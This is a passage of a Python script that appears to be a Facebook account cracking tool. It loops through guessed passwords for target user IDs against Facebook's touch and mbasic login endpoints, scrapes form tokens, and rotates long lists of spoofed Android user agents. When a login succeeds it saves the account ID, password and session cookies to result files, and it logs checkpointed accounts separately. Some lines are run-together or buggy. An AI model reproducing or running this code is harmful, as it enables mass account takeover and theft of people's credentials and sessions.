AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220",
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"sec-fetch-site": "same-origin",
					"sec-fetch-mode": "navigate",
					"sec-fetch-user": "?1",
					"sec-fetch-dest": "document",
					f"referer": "https://touch.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
				po = ses.post("https://touch.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers = header, allow_redirects = True)
				if "c_user" in ses.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					print(f" {H}* --> {user}|{pw}|{coki}")
					ok.append(f"{user}|{pw}|{coki}")
					_wrt_ = "%s|%s|%s\n"%(user,pw,coki)
					open("Results/OK-%s","a"%(_datetime)).write(_wrt_)
					break
				elif "checkpoint" in ses.cookies.get_dict():
					print(f" {K}* --> {user}|{pw}")
					cp.append(f"{user}|{pw}")
					_wrt_ = "%s|%s\n"%(user,pw)
					open("Results/CP-%s","a"%(_datetime_)).write(_wrt_)
					break
				else:
					continue
			loop +=1
		except requests.exceptions.ConnectionError:
			time.sleep(50)

	def mbasic(self, user, pwx):
		global ok, cp, loop, opsi, apk
		warna = random.choice([M,K,H,U,P,O,N])
		sys.stdout.write("\r %s•%s• %s[>_] %s/%s [OK:%s][CP:%s]."%(M,K, warna, loop, len(id), len(ok), len(cp)));sys.stdout.flush()
		try:
			for pw in pwx:
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12;M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220"])
				head = {
					"Host": "mbasic.facebook.com",
					"cache-control": "max-age=0",
					"upgrade-insecure-requests": "1",
					"user-agent": ua,
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"sec-fetch-site": "same-origin",
					"sec-fetch-mode": "navigate",
					"sec-fetch-user": "?1",
					"sec-fetch-dest": "document",
					"sec-ch-ua-mobile": "?1",
					"referer": "https://free.facebook.com/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
				x = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
				cari = {
					"lsd":re.search('name="lsd" value="(.*?)"', str(x.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(x.text)).group(1),
					"uid":user,
					"flow":"login_no_pin",
					"pass":pw,
					"next":"https://mbasic.facebook.com/login/save-device/"
				}
				header_post = {
					"Host": "mbasic.facebook.com",
					"content-length": "145",
					"cache-control": "max-age=0",
					"sec-ch-ua-mobile": "?1",
					"upgrade-insecure-requests": "1",
					"origin": "https://mbasic.facebook.com",
					"content-type": "application/x-www-form-urlencoded",
					"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG 